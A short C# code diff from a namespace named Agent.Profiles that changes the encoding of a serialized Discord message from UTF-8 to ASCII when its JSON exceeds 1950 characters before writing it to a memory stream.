@@ -191,7 +191,7 @@ namespace Agent.Profiles
 
             if (json.Length > 1950)
             {
-                using (MemoryStream stream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
+                using (MemoryStream stream = new MemoryStream(System.Text.Encoding.ASCII.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
                 {
                     try
                     {
